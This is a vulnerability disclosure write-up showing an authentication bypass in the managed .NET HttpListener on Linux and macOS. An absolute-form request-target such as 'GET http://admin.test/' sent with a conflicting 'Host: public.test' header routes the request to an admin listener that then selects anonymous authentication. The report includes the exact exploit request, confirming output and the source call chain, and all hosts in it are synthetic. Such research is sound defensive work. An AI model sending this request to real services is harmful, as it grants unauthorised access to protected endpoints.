# HttpListener absolute-form authority confusion -> framework-owned routing + authentication bypass

## Executive summary

On the managed HttpListener implementation used by Linux/macOS, one HTTP/1.1 absolute-form request can expose two
different authorities inside the framework:

- `HttpListenerRequest.Url.Host` = authority from the absolute request-target
- `HttpListenerRequest.UserHostName` = received `Host` field

That split occurs before HttpListener chooses the target listener and before it invokes
`AuthenticationSchemeSelectorDelegate`.

The framework itself therefore performs two inconsistent security-relevant decisions for one request:

1. `HttpEndPointListener.SearchListener(Request.Url)` chooses the destination HttpListener from `Url.Host`.
2. The selected listener's `AuthenticationSchemeSelectorDelegate` can then make its authentication decision using
   the Microsoft-documented `UserHostName` property.

A request can consequently be routed by HttpListener to an admin listener while the admin listener's own built-in
authentication selector sees the public authority and selects Anonymous.

No custom application router is required.

## Clean full matrix

Run:

https://github.com/SamCloudJourney/basic-website/actions/runs/35528291290

Branch:

`research/dotnet-httplistener-framework-routing-20260920`

Matrix:

- .NET 8.0.31 / Ubuntu 24.04.5: vulnerable
- .NET 9.0.20 / Ubuntu 24.04.5: vulnerable
- .NET 10.0.12 / Ubuntu 24.04.5: vulnerable
- .NET 10.0.12 / macOS 15.7.9: vulnerable
- .NET 10.0.12 / Windows 2025 / http.sys: safe negative control

Synthetic authorities `public.test` and `admin.test` are mapped to loopback only in the researcher-controlled CI job.

## Framework configuration

Two distinct HttpListener instances share one researcher-controlled loopback endpoint:

```csharp
publicListener.Prefixes.Add($"http://public.test:{port}/");
adminListener.Prefixes.Add($"http://admin.test:{port}/");
```

The public listener is Anonymous.

The admin listener uses HttpListener's documented per-request selector:

```csharp
adminListener.AuthenticationSchemeSelectorDelegate = request =>
{
    string hostOnly = request.UserHostName.Split(':')[0];

    return hostOnly == "public.test"
        ? AuthenticationSchemes.Anonymous
        : AuthenticationSchemes.Basic;
};
```

The application does not inspect `Request.Url` to choose an admin resource. The managed HttpListener prefix router
selects the listener.

## Public control

```http
GET / HTTP/1.1
Host: public.test:<port>
Connection: close
```

Result on all tested platforms:

```text
HTTP/1.1 200 OK
basicChallenge=False
publicContext=True
adminContext=False
adminSentinel=False
```

## Admin control

```http
GET / HTTP/1.1
Host: admin.test:<port>
Connection: close
```

Managed Linux .NET 10 example:

```text
SELECTOR listener=ADMIN
UserHostName=admin.test:<port>
Url.Host=admin.test
Selected=Basic

HTTP/1.1 401 Unauthorized
basicChallenge=True
publicContext=False
adminContext=False
adminSentinel=False
```

The unauthenticated request is not delivered to the protected admin listener.

## Exploit request

```http
GET http://admin.test:<port>/ HTTP/1.1
Host: public.test:<port>
Connection: close
```

Managed Linux .NET 10:

```text
SELECTOR listener=ADMIN
UserHostName=public.test:<port>
Url.Host=admin.test
Selected=Anonymous

ADMIN_CONTEXT
UserHostName=public.test:<port>
Url.Host=admin.test
User=ANONYMOUS

HTTP/1.1 200 OK
basicChallenge=False
publicContext=False
adminContext=True
adminSentinel=True

FRAMEWORK_PREFIX_ROUTING_AUTH_BYPASS=CONFIRMED
```

The same result is confirmed on .NET 8.0.31 Linux, .NET 9.0.20 Linux, .NET 10.0.12 Linux, and .NET 10.0.12 macOS.

## Windows/http.sys negative control

The identical synthetic security model and attack request on .NET 10.0.12 Windows:

```text
SELECTOR listener=ADMIN
UserHostName=admin.test:<port>
Url.Host=admin.test
Selected=Basic

HTTP/1.1 401 Unauthorized
basicChallenge=True
publicContext=False
adminContext=False
adminSentinel=False

FRAMEWORK_PREFIX_WINDOWS_NEGATIVE_CONTROL=PASS
```

http.sys presents one canonical admin authority to both routing and authentication.

## Current source call chain

Validated source commit during research:

`12921b1d8c6865a774232de9379133020ad23d79`

Managed request initialization:

`src/libraries/System.Net.HttpListener/src/System/Net/Managed/HttpListenerRequest.Managed.cs`

The implementation begins from the Host-derived public property:

```csharp
ReadOnlySpan<char> host = UserHostName;
```

For an absolute-form target it later replaces only the local host used to construct `Request.Url`:

```csharp
if (raw_uri != null)
    host = raw_uri.Host;
```

The public property remains:

```csharp
public string UserHostName => Headers[HttpKnownHeaderNames.Host]!;
```

Framework prefix selection then uses the canonical URI:

`src/libraries/System.Net.HttpListener/src/System/Net/Managed/HttpEndPointListener.cs`

```csharp
HttpListener? listener = SearchListener(req.Url, out prefix);
...
string host = uri.Host;
...
if (p.Host != host || p.Port != port)
    continue;
...
bestMatch = localPrefixes[p];
```

After binding the context to that listener, the managed authentication path invokes its selector:

`src/libraries/System.Net.HttpListener/src/System/Net/Managed/ListenerAsyncResult.Managed.cs`

```csharp
context.AuthenticationSchemes =
    context._listener!.SelectAuthenticationScheme(context);
```

`src/libraries/System.Net.HttpListener/src/System/Net/Managed/HttpListener.Managed.cs`

```csharp
return AuthenticationSchemeSelectorDelegate != null
    ? AuthenticationSchemeSelectorDelegate(context.Request)
    : _authenticationScheme;
```

If Basic is selected and no valid Authorization header exists, the framework emits 401 and
`WWW-Authenticate: Basic ...` and does not complete the context to application code. If Anonymous is selected, the
context is completed and returned.

## Protocol invariant

RFC 9112 section 3.2.2 requires an origin server that accepts an absolute-form request-target to ignore the received
Host field and instead use the authority from the request-target.

https://www.rfc-editor.org/rfc/rfc9112.html#section-3.2.2

The same section states that servers must accept absolute-form, so simply rejecting all absolute-form requests is not
the protocol-preserving fix.

## Microsoft-documented authentication pattern

Microsoft documents `AuthenticationSchemeSelectorDelegate` as the mechanism for selecting different authentication
protocols based on characteristics of incoming requests.

Microsoft also documents `Url` and `UserHostName` as properties applications can use when selecting per-request
authentication mechanisms.

- https://learn.microsoft.com/dotnet/api/system.net.httplistener.authenticationschemeselectordelegate
- https://learn.microsoft.com/dotnet/api/system.net.httplistener.authenticationschemes

Microsoft's documentation states that an unauthenticated request which cannot satisfy the chosen authentication
mechanism is automatically answered with 401 and is not returned as an incoming context.

The vulnerable request violates exactly that property: the same admin listener which returns 401 for the ordinary
admin request returns an anonymous context for the conflicting absolute-form request.

## Security invariant

For a single accepted HTTP request, HttpListener must not use one authority to select the target listener/resource and
a different authority to select the authentication policy protecting that listener/resource.

## Scope

All hosts, listeners, ports, actions, credentials, and response sentinels used by this proof are synthetic and
researcher-controlled. No production services or third-party data are involved.
